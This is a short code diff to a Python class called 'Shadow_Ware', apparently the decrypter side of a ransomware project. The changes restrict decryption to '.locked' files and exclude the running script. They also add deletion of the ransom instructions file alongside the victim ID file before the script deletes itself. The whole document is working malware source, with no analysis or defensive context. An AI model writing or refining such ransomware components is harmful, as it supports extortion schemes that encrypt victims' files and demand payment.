@@ -74,7 +74,7 @@ class Shadow_Ware():
   def decrypt_all_files(self):
     files = self.get_all_files(self.current_dir)
     for file in files:
-      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath("decrypter.py"):
+      if file not in self.ignored_files and os.path.abspath(file) != os.path.abspath(__file__) and file.endswith(".locked"):
         print("Unlocking file " + file)
         self.decrypt_file(file, file[0:-7])
 
@@ -96,6 +96,10 @@ class Shadow_Ware():
       os.remove(os.path.abspath("ID.id"))
     except Exception as e:
       print("Failed to remove ID.id for " + e)
+    try:
+        os.remove(os.path.abspath("instructions.txt"))
+    except Exception as e:
+      print("Failed to remove instructions.txt for " + e)
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
